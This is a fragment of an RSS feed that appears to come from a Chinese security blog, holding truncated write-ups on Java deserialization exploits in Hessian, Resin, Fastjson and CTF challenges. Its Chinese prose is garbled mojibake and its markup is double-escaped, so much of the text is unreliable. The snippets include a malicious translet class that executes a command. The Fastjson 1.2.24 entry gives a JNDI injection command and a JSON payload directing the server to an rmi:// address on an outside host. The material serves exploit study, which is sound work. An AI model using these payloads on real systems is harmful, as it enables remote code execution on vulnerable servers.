1 2 3 4 5 6 7 8 9 10 â€¦</content:encoded></item><item><title>0CTF2022 Hessian_onlyjdk</title><link>https://baozongwi.xyz/p/0ctf-2022-hessian-onlyjdk/</link><guid>https://baozongwi.xyz/p/0ctf-2022-hessian-onlyjdk/</guid><pubDate>Tue, 18 Nov 2025 21:34:05 +0800</pubDate><description> https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2022/hessian-onlyJdk/deploy/hessian-onlyJdk.jar
hint:
https://y4er.com/posts/wangdingbei-badbean-hessian2/
https://x-stream.github.io/CVE-2021-21346.html
ç¬¬ä¸€ä¸ª hint è¯´æ˜æ˜¯ä» toString æ–¹æ³•å‡ºå‘ï¼Œç¬¬äºŒä¸ª hint æ˜¯ä¸€æ¡ gadget
1 2 3 4 5 6 7 8 Rdn$RdnEntry#compareTo-&amp;amp;gt; XString#equal-&amp;amp;gt; MultiUIDefaults#toString-&amp;amp;gt; UIDefaults#get-&amp;amp;gt; UIDefaults#getFromHashTable-&amp;amp;gt; UIDefaults$LazyValue#createValue-&amp;amp;gt; SwingLazyValue#createValue-&amp;amp;gt; InitialContext#doLookup() ä½†æ˜¯çœ‹äº†çŸ¥é“åˆ›å®‡çš„æ–‡ç« å‘ç°
javax.swing.MultiUIDefaultsæ˜¯peotectç±»ï¼Œåªèƒ½åœ¨javax.swing.ä¸­ä½¿ç”¨ï¼Œè€Œä¸”Hessian2æ‹¿åˆ°äº†æ„é€ å™¨ï¼Œä½†æ˜¯æ²¡æœ‰setAccessableï¼ŒnewInstanceå°±æ²¡æœ‰æƒé™ æ‰€ä»¥è¦æ‰¾é“¾çš„è¯éœ€è¦ç±»æ˜¯publicçš„ï¼Œæ„é€ å™¨ä¹Ÿæ˜¯publicçš„ï¼Œæ„é€ å™¨çš„å‚æ•°ä¸ªæ•°ä¸è¦ç´§ï¼Œhessian2ä¼šè‡ªåŠ¨æŒ¨ä¸ªæµ‹è¯•æ„é€ å™¨ç›´åˆ°æˆåŠŸ æ‰€ä»¥è¿™æ¡é“¾å­çš„å¯ç”¨æ€§è¿˜å‰©ä¸‹
1 2 3 4 UIDefaults#get-&amp;amp;gt; UIDefaults#getFromHashTable-&amp;amp;gt; UIDefaults$LazyValue#createValue-&amp;amp;gt; SwingLazyValue#createValue-&amp;amp;gt; è€Œ UIDefaults æ˜¯ Hashtable çš„å­ç±»ï¼Œçœ‹ä¸‹SwingLazyValue#createValue
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public Object createValue(UIDefaults var1) { try { ReflectUtil.checkPackageAccess(this.className); Class var2 = Class.forName(this.className, true, (ClassLoader)null); if (this.methodName != null) { Class[] var6 = this.getClassArray(this.args); Method var7 = var2.getMethod(this.methodName, var6); this.makeAccessible(var7); return var7.invoke(var2, this.args); } else { Class[] var3 = this.getClassArray(this.args); Constructor var4 = var2.getConstructor(var3); this.makeAccessible(var4); return var4.newInstance(this.args); } } catch (Exception var5) { return null; } } å¯ä»¥è°ƒç”¨ä»»æ„ public æ–¹æ³•ï¼Œæ‰€ä»¥åªéœ€è¦æ‰¾ä¸€æ¡ toString è§¦å‘Hashtable#getï¼Œå¹¶ä¸”åœ¨åé¢æ‹¼æ¥åˆé€‚çš„ public æ–¹æ³•çš„ gadgetï¼Œä½†æ˜¯ç”±äºä¸è€ƒè™‘ Transformer é“¾ï¼Œæ‰€ä»¥é€‰æ‹©æ‰¾é™æ€ public æ–¹æ³•ï¼Œä¾èµ–åªå­˜åœ¨ jdk8u324 å’Œ hessian2ï¼Œå…¶ä¸­jdkçš„ç‰ˆæœ¬æ»¡è¶³åŠ è½½ BCEL å­—èŠ‚ç ã€‚æ‰¾åˆ°JavaWrapper#_mainæ–¹æ³•</description><content:encoded> https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2022/hessian-onlyJdk/deploy/hessian-onlyJdk.jar
hint: â€¦</content:encoded></item><item><title>Hessianååºåˆ—åŒ–</title><link>https://baozongwi.xyz/p/hessian-deserialization/</link><guid>https://baozongwi.xyz/p/hessian-deserialization/</guid><pubDate>Tue, 18 Nov 2025 01:00:59 +0800</pubDate><description>åºåˆ—åŒ– HessianOutput å’Œ Hessian2Output éƒ½æ˜¯æŠ½è±¡ç±» AbstractHessianOutput çš„å®ç°ï¼ŒäºŒè€…çš„ writeObject æ–¹æ³•ä¸€è‡´ï¼Œæ ¹æ®ä¼ å…¥çš„ object çš„ç±»å‹ï¼Œè·å–å¯¹åº”éœ€è¦çš„åºåˆ—åŒ–å™¨ï¼Œè°ƒç”¨åºåˆ—åŒ–å™¨çš„ writeObject æ–¹æ³•åºåˆ—åŒ–æ•°æ®ã€‚ä»£ç å¦‚ä¸‹
1 2 3 4 5 6 7 8 public void writeObject(Object object) throws IOException { if (object == null) { this.writeNull(); } else { Serializer serializer = this.findSerializerFactory().getObjectSerializer(object.getClass()); serializer.writeObject(object, this); } } è·Ÿè¿› getObjectSerializer
1 2 3 4 public Serializer getObjectSerializer(Class&amp;amp;lt;?&amp;amp;gt; cl) throws HessianProtocolException { Serializer serializer = this.getSerializer(cl); return serializer instanceof ObjectSerializer ? ((ObjectSerializer)serializer).getObjectSerializer() : serializer; } è·Ÿè¿› getSerializer</description><content:encoded>åºåˆ—åŒ– HessianOutput å’Œ Hessian2Output éƒ½æ˜¯æŠ½è±¡ç±» AbstractHessianOutput çš„å®ç°ï¼ŒäºŒè€…çš„ writeObject æ–¹æ³•ä¸€è‡´ï¼Œæ ¹æ®ä¼ å…¥çš„ object çš„ç±»å‹ï¼Œè·å–å¯¹åº”éœ€è¦çš„åºåˆ—åŒ–å™¨ï¼Œè°ƒç”¨åºåˆ—åŒ–å™¨çš„ writeObject æ–¹æ³•åºåˆ—åŒ–æ•°æ®ã€‚ â€¦</content:encoded></item><item><title>CISCN2023 Deserbug</title><link>https://baozongwi.xyz/p/ciscn-2023-deserbug/</link><guid>https://baozongwi.xyz/p/ciscn-2023-deserbug/</guid><pubDate>Fri, 14 Nov 2025 00:53:01 +0800</pubDate><description> cn.hutool.json.JSONObject.put-&amp;amp;gt;com.app.Myexpect#getAnyexcept jdk8u202 é¢˜ç›®æç¤ºäº†ç±»ï¼Œjdk8u202 å’Œ 8u66 æˆ‘æ„Ÿè§‰æ˜¯ä¸€æ ·çš„
commons-collections-3.2.2.jar
hutool-all-5.8.18.jar
å…ˆå‡†å¤‡æ¶æ„ç±»
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package org.deserbug; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Evil extends AbstractTranslet { static { try { Runtime.getRuntime().exec(&amp;amp;#34;calc&amp;amp;#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} } commons-collections-3.2.2ï¼Œæ‰€ä»¥ InvokeTransformer ä¹‹ç±»çš„éƒ½ä¸èƒ½ä½¿ç”¨äº†ï¼Œå’Œ CC3 ä¸€æ ·ç”¨ TrAXFilterï¼Œé¢˜ç›®æç¤ºçš„ JSONObject ç±»å’Œ fastjson çš„å¹¶ä¸åŒï¼Œä¸æ˜¯ä»»æ„è§¦å‘ getter\setter æ–¹æ³•ï¼Œ</description><content:encoded> cn.hutool.json.JSONObject.put-&amp;amp;amp;gt;com.app.Myexpect#getAnyexcept jdk8u202 é¢˜ç›®æç¤ºäº†ç±»ï¼Œjdk8u202 å’Œ 8u66 æˆ‘æ„Ÿè§‰æ˜¯ä¸€æ ·çš„
commons-collections-3.2.2.jar â€¦</content:encoded></item><item><title>Resinååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/resin-deserialization-vuln/</link><guid>https://baozongwi.xyz/p/resin-deserialization-vuln/</guid><pubDate>Tue, 04 Nov 2025 01:28:35 +0800</pubDate><description>ç‰¹ä¹ˆçš„ï¼Œä¸€å¼€å§‹å› ä¸ºæƒ³å­¦ä¹  jackson ååºåˆ—åŒ–æ¼æ´ï¼Œæˆ‘å‘ç°æœ‰ gadget å’Œ hessian å·®ä¸å¤šï¼Œç„¶åçœ‹äº† hessian å‘ç°å’Œè¿™ä¸ªå·®ä¸å¤šï¼Œmanã€‚ğŸ˜…è€Œä¸”ç½‘ä¸Šå‚è€ƒå¥½å°‘&amp;amp;hellip;
ç®€ä»‹ Resinæ˜¯ç”±CAUCHOå…¬å¸å¼€å‘çš„æµè¡Œå¼•æ“ï¼Œæ”¯æŒServletså’ŒJSPï¼Œé€Ÿåº¦æå¿«ã€‚å®ƒå†…ç½®HTTP/1.1 WEBæœåŠ¡å™¨ï¼Œä¸ä»…æ“…é•¿å¤„ç†åŠ¨æ€å†…å®¹ï¼Œè¿˜èƒ½é«˜æ•ˆæ˜¾ç¤ºé™æ€å†…å®¹ï¼Œæ€§èƒ½æ¥è¿‘Apache Serverï¼Œæ‰€ä»¥ç­‰ä¼šè¿˜ä¼šæ¶‰åŠå†…å­˜é©¬çš„è¯´æ³•ã€‚
ååºåˆ—åŒ–åˆ©ç”¨é“¾ pom.xml å¦‚ä¸‹
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 &amp;amp;lt;?xml version=&amp;amp;#34;1.0&amp;amp;#34; encoding=&amp;amp;#34;UTF-8&amp;amp;#34;?&amp;amp;gt; &amp;amp;lt;project xmlns=&amp;amp;#34;http://maven.apache.org/POM/4.0.0&amp;amp;#34; xmlns:xsi=&amp;amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;amp;#34; xsi:schemaLocation=&amp;amp;#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;modelVersion&amp;amp;gt;4.0.0&amp;amp;lt;/modelVersion&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.example&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;TwiceReadObject&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;1.0-SNAPSHOT&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;properties&amp;amp;gt; &amp;amp;lt;maven.compiler.source&amp;amp;gt;8&amp;amp;lt;/maven.compiler.source&amp;amp;gt; &amp;amp;lt;maven.compiler.target&amp;amp;gt;8&amp;amp;lt;/maven.compiler.target&amp;amp;gt; &amp;amp;lt;project.build.sourceEncoding&amp;amp;gt;UTF-8&amp;amp;lt;/project.build.sourceEncoding&amp;amp;gt; &amp;amp;lt;resin.version&amp;amp;gt;4.0.64&amp;amp;lt;/resin.version&amp;amp;gt; &amp;amp;lt;javassist.version&amp;amp;gt;3.28.0-GA&amp;amp;lt;/javassist.version&amp;amp;gt; &amp;amp;lt;tomcat.version&amp;amp;gt;8.5.6&amp;amp;lt;/tomcat.version&amp;amp;gt; &amp;amp;lt;fastjson.version&amp;amp;gt;1.2.83&amp;amp;lt;/fastjson.version&amp;amp;gt; &amp;amp;lt;/properties&amp;amp;gt; &amp;amp;lt;dependencies&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.javassist&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;javassist&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;${javassist.version}&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;com.caucho&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;resin&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;4.0.64&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;exclusions&amp;amp;gt; &amp;amp;lt;exclusion&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;com.caucho&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;javaee-16&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;/exclusion&amp;amp;gt; &amp;amp;lt;/exclusions&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.apache.tomcat.embed&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;tomcat-embed-core&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;${tomcat.version}&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.apache.tomcat.embed&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;tomcat-embed-el&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;${tomcat.version}&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;com.alibaba&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;fastjson&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;${fastjson.version}&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;/dependencies&amp;amp;gt; &amp;amp;lt;/project&amp;amp;gt; Qname#toString è¿™æ¡åˆ©ç”¨é“¾æ˜¯é€šè¿‡ä»»æ„ toString æ¥è§¦å‘çš„ï¼Œsink ç‚¹ä¸ºQname#toString</description><content:encoded>ç‰¹ä¹ˆçš„ï¼Œä¸€å¼€å§‹å› ä¸ºæƒ³å­¦ä¹  jackson ååºåˆ—åŒ–æ¼æ´ï¼Œæˆ‘å‘ç°æœ‰ gadget å’Œ hessian å·®ä¸å¤šï¼Œç„¶åçœ‹äº† hessian å‘ç°å’Œè¿™ä¸ªå·®ä¸å¤šï¼Œmanã€‚ğŸ˜…è€Œä¸”ç½‘ä¸Šå‚è€ƒå¥½å°‘&amp;amp;amp;hellip;
ç®€ä»‹ Resinæ˜¯ç”±CAUCHOå…¬å¸å¼€å‘çš„æµè¡Œå¼•æ“ï¼Œæ”¯æŒServletså’ŒJSPï¼Œé€Ÿåº¦æå¿«ã€‚å®ƒå†… â€¦</content:encoded></item><item><title>LILCTF2025 BladeCC</title><link>https://baozongwi.xyz/p/lilctf2025-blade-cc/</link><guid>https://baozongwi.xyz/p/lilctf2025-blade-cc/</guid><pubDate>Wed, 29 Oct 2025 22:36:22 +0800</pubDate><description>å‰è¨€ é¦–å…ˆæ”¾å‡ºé¢˜ç›®ä»“åº“ï¼Œæœ‰ä»“åº“çš„æ¯”èµ›å‘æ¥æ˜¯å¥½æ¯”èµ›ğŸ˜
https://github.com/Lil-House/LilCTF-2025/tree/main/challenges/web-blade-cc/build
blade_cc
å‡ºé¢˜ï¼šN1ght
éš¾åº¦ï¼šå›°éš¾
é¢˜ç›®æè¿°ï¼š
ä¸‡æ¶çš„n1ghtï¼Œç•™å‡ºäº†ä¸€ä¸ªååºåˆ—åŒ–å…¥å£ï¼Œä½†æ˜¯ä»–åšäº†é»‘åå•å’Œä¸å‡ºç½‘ï¼Œä½ èƒ½æƒ³åŠæ³•å®Œæˆè¿™ä¸ªæŒ‘æˆ˜å—ï¼Ÿ
é¢˜ç›® åˆ†æ ä¸€çœ‹é»‘åå•ï¼ŒCCä¾èµ–ï¼Œå¯åˆ©ç”¨ RMIConnector äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡ï¼Œå¼€å§‹åˆ©ç”¨é“¾åˆ†æ
åœ¨EventListenerList#readObjectä¸­æœ‰ä¸€ä¸ª add æ–¹æ³•ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶ç›‘å¬ç±»
1 2 3 4 5 6 7 8 9 10 11 12 13 14 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { listenerList = NULL_ARRAY; s.defaultReadObject(); Object listenerTypeOrNull; while (null != (listenerTypeOrNull = s.readObject())) { ClassLoader cl = Thread.currentThread().getContextClassLoader(); EventListener l = (EventListener)s.readObject(); String name = (String) listenerTypeOrNull; ReflectUtil.checkPackageAccess(name); add((Class&amp;amp;lt;EventListener&amp;amp;gt;)Class.forName(name, true, cl), l); } } è·Ÿè¿›</description><content:encoded>å‰è¨€ é¦–å…ˆæ”¾å‡ºé¢˜ç›®ä»“åº“ï¼Œæœ‰ä»“åº“çš„æ¯”èµ›å‘æ¥æ˜¯å¥½æ¯”èµ›ğŸ˜
https://github.com/Lil-House/LilCTF-2025/tree/main/challenges/web-blade-cc/build
blade_cc
å‡ºé¢˜ï¼šN1ght
éš¾åº¦ï¼šå›°éš¾
é¢˜ç›®æè¿°ï¼š
ä¸‡æ¶çš„n1ghtï¼Œç•™å‡ºäº†ä¸€ â€¦</content:encoded></item><item><title>JavaäºŒæ¬¡ååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/java-secondary-deserialization/</link><guid>https://baozongwi.xyz/p/java-secondary-deserialization/</guid><pubDate>Tue, 28 Oct 2025 19:15:34 +0800</pubDate><description>ä¸ºä»€ä¹ˆéœ€è¦äºŒæ¬¡ååºåˆ—åŒ–ï¼Œåœ¨åœºæ™¯ä¸­ï¼Œä»£ç é€šè¿‡é‡å†™ObjectInputStream#resolveClassè¿›è¡Œé»‘åå•é˜²å¾¡ã€‚è€ŒäºŒæ¬¡ååºåˆ—åŒ–é“¾æ‰€éœ€çš„ç±»åä¸åœ¨é»‘åå•ä¸­ï¼Œä»è€Œ bypassã€‚
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package util; import java.io.IOException; import java.io.InputStream; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; import java.util.Arrays; import java.util.HashSet; import java.util.Set; public class SafeObjectInputStream extends ObjectInputStream { private static final Set&amp;amp;lt;String&amp;amp;gt; BLACKLIST = new HashSet&amp;amp;lt;String&amp;amp;gt;(Arrays.asList(new String[] { &amp;amp;#34;javax.management.BadAttributeValueExpException&amp;amp;#34;, &amp;amp;#34;org.apache.commons.collections4.map.AbstractHashedMap&amp;amp;#34;, &amp;amp;#34;org.springframework.aop.target.HotSwappableTargetSource&amp;amp;#34;, &amp;amp;#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&amp;amp;#34; })); public SafeObjectInputStream(InputStream in) throws IOException { super(in); } protected Class&amp;amp;lt;?&amp;amp;gt; resolveClass(ObjectStreamClass desc) throws ClassNotFoundException, IOException { String className = desc.getName(); if (BLACKLIST.contains(className)) throw new InvalidClassException(&amp;amp;#34;Disallowed deserialization attempt: &amp;amp;#34; + className); return super.resolveClass(desc); } } å®é™…å°±æ˜¯æˆ‘ä»¬ä» readObject è§¦å‘æŸä¸€ä¸ªç±»çš„æŸä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•èƒ½å¤Ÿå†æ¬¡åˆ° readObjectï¼Œå†å°†å¸¸è§„çš„é“¾å­æ‹¼æ¥ä¸Šå»å³å¯ã€‚</description><content:encoded>ä¸ºä»€ä¹ˆéœ€è¦äºŒæ¬¡ååºåˆ—åŒ–ï¼Œåœ¨åœºæ™¯ä¸­ï¼Œä»£ç é€šè¿‡é‡å†™ObjectInputStream#resolveClassè¿›è¡Œé»‘åå•é˜²å¾¡ã€‚è€ŒäºŒæ¬¡ååºåˆ—åŒ–é“¾æ‰€éœ€çš„ç±»åä¸åœ¨é»‘åå•ä¸­ï¼Œä»è€Œ bypassã€‚
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 â€¦</content:encoded></item><item><title>AliCTF2025-Jtools</title><link>https://baozongwi.xyz/p/alictf-2025-jtools/</link><guid>https://baozongwi.xyz/p/alictf-2025-jtools/</guid><pubDate>Wed, 22 Oct 2025 20:39:41 +0800</pubDate><description>åœ¨åšé¢˜ä¹‹å‰ï¼Œå…ˆæµ…æµ…å­¦ä¹ ä¸‹ fury çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æœºåˆ¶ã€‚
äº†è§£ åºåˆ—åŒ– å…ˆå†™ä¸€ä¸ªç±»ç”¨
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package org.Fury.Base; import java.io.Serializable; public class User implements Serializable { private String username; private boolean isAdmin; public User(String username, boolean isAdmin) { this.username = username; this.isAdmin = isAdmin; } public User() {} public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public boolean isAdmin() { return isAdmin; } public void setAdmin(boolean admin) { isAdmin = admin; } @Override public String toString() { return &amp;amp;#34;User : {&amp;amp;#34; + &amp;amp;#34;username=&amp;amp;#39;&amp;amp;#34; + username + &amp;amp;#39;\&amp;amp;#39;&amp;amp;#39; + &amp;amp;#34;, isAdmin=&amp;amp;#34; + isAdmin + &amp;amp;#39;}&amp;amp;#39;; } } åºåˆ—åŒ–ç±»</description><content:encoded>åœ¨åšé¢˜ä¹‹å‰ï¼Œå…ˆæµ…æµ…å­¦ä¹ ä¸‹ fury çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æœºåˆ¶ã€‚
äº†è§£ åºåˆ—åŒ– å…ˆå†™ä¸€ä¸ªç±»ç”¨
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 â€¦</content:encoded></item><item><title>Fastjson1.2.80ååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/fastjson-1.2.80-deserialization/</link><guid>https://baozongwi.xyz/p/fastjson-1.2.80-deserialization/</guid><pubDate>Tue, 21 Oct 2025 22:08:24 +0800</pubDate><description>1.2.68 ç‰ˆæœ¬ä¿®å¤æ–¹æ¡ˆï¼Œæ˜¯å°†java.lang.Runnableã€java.lang.Readableå’Œjava.lang.AutoCloseableåŠ å…¥é»‘åå•ï¼Œé‚£ä¹ˆ 1.2.80 ç”¨çš„å°±æ˜¯å¦ä¸€ä¸ªæœŸæœ›ç±»ï¼Œå¼‚å¸¸ç±»Throwableã€‚
å…³é”®ç‚¹åœ¨äºååºåˆ—åŒ–setter method parameter OR public fieldï¼ˆæ— è§†autotypeï¼‰æ—¶æ·»åŠ ç±»åˆ°ç™½åå•
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 &amp;amp;lt;?xml version=&amp;amp;#34;1.0&amp;amp;#34; encoding=&amp;amp;#34;UTF-8&amp;amp;#34;?&amp;amp;gt; &amp;amp;lt;project xmlns=&amp;amp;#34;http://maven.apache.org/POM/4.0.0&amp;amp;#34; xmlns:xsi=&amp;amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;amp;#34; xsi:schemaLocation=&amp;amp;#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;modelVersion&amp;amp;gt;4.0.0&amp;amp;lt;/modelVersion&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.example&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;fastjson-groovy-gadget&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;1.0-SNAPSHOT&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;properties&amp;amp;gt; &amp;amp;lt;maven.compiler.source&amp;amp;gt;8&amp;amp;lt;/maven.compiler.source&amp;amp;gt; &amp;amp;lt;maven.compiler.target&amp;amp;gt;8&amp;amp;lt;/maven.compiler.target&amp;amp;gt; &amp;amp;lt;project.build.sourceEncoding&amp;amp;gt;UTF-8&amp;amp;lt;/project.build.sourceEncoding&amp;amp;gt; &amp;amp;lt;fastjson.version&amp;amp;gt;1.2.80&amp;amp;lt;/fastjson.version&amp;amp;gt; &amp;amp;lt;/properties&amp;amp;gt; &amp;amp;lt;dependencies&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;com.alibaba&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;fastjson&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;${fastjson.version}&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;/dependencies&amp;amp;gt; &amp;amp;lt;/project&amp;amp;gt; æ¼æ´åˆ†æ ç”±äºéœ€è¦ç›´æ¥æˆ–é—´æ¥çš„ç»§æ‰¿å¼‚å¸¸ç±»Throwableï¼Œæ‰€ä»¥é‡æ–°å†™ä¸ªæ¶æ„ç±»</description><content:encoded>1.2.68 ç‰ˆæœ¬ä¿®å¤æ–¹æ¡ˆï¼Œæ˜¯å°†java.lang.Runnableã€java.lang.Readableå’Œjava.lang.AutoCloseableåŠ å…¥é»‘åå•ï¼Œé‚£ä¹ˆ 1.2.80 ç”¨çš„å°±æ˜¯å¦ä¸€ä¸ªæœŸæœ›ç±»ï¼Œå¼‚å¸¸ç±»Throwableã€‚
å…³é”®ç‚¹åœ¨äºååºåˆ—åŒ–setter method parameter â€¦</content:encoded></item><item><title>Fastjson1.2.6Xååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/fastjson-1.2.6x-deserialization/</link><guid>https://baozongwi.xyz/p/fastjson-1.2.6x-deserialization/</guid><pubDate>Fri, 17 Oct 2025 21:57:20 +0800</pubDate><description>1.2.68æ™•æ™•ç»•ç»•</description><content:encoded>1.2.62 ç»„ä»¶æ¼æ´
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 &amp;amp;amp;lt;?xml version=&amp;amp;amp;#34;1.0&amp;amp;amp;#34; â€¦</content:encoded></item><item><title>Fastjson1.4.Xååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/fastjson-1.2.4x-deserialization/</link><guid>https://baozongwi.xyz/p/fastjson-1.2.4x-deserialization/</guid><pubDate>Fri, 17 Oct 2025 21:53:02 +0800</pubDate><description>1.2.47ç¼“å­˜è®©ä½ RCEï¼</description><content:encoded>1.2.41 1 2 3 4 5 6 7 8 9 if (key == JSON.DEFAULT_TYPE_KEY &amp;amp;amp;amp;&amp;amp;amp;amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) { String typeName = â€¦</content:encoded></item><item><title>Fastjson1.2.24ååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/fastjson-1.2.24-deserialization/</link><guid>https://baozongwi.xyz/p/fastjson-1.2.24-deserialization/</guid><pubDate>Thu, 16 Oct 2025 21:15:30 +0800</pubDate><description>ç‰ˆæœ¬é™åˆ¶ä¸º &amp;amp;lt;= 1.2.24 å³å¯ã€‚
æ¼æ´å¤ç° ä½¿ç”¨vulhubï¼Œè¿›è¡Œç¯å¢ƒæ­å»º
1 2 cd vulhub/fastjson/1.2.24-rce docker compose up -d è®¿é—® 8090 ç«¯å£æœåŠ¡ï¼Œå¼€å¯æ¶æ„æœåŠ¡
1 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;amp;#34;touch /tmp/baozongwi&amp;amp;#34; -A &amp;amp;#34;154.36.152.109&amp;amp;#34; å‘é€æ•°æ®åŒ…
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST / HTTP/1.1 Host: 154.36.152.109:8090 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Cookie: JSESSIONID.b1f176ee=node014bva1kp2vq14rv5nqb9eyg0x0.node0 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Content-Type: application/json { &amp;amp;#34;b&amp;amp;#34;:{ &amp;amp;#34;@type&amp;amp;#34;:&amp;amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;amp;#34;, &amp;amp;#34;dataSourceName&amp;amp;#34;:&amp;amp;#34;rmi://154.36.152.109:1099/axpxbe&amp;amp;#34;, &amp;amp;#34;autoCommit&amp;amp;#34;:true } } æˆåŠŸåœ¨tmpç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶</description><content:encoded>ç‰ˆæœ¬é™åˆ¶ä¸º &amp;amp;amp;lt;= 1.2.24 å³å¯ã€‚
æ¼æ´å¤ç° ä½¿ç”¨vulhubï¼Œè¿›è¡Œç¯å¢ƒæ­å»º
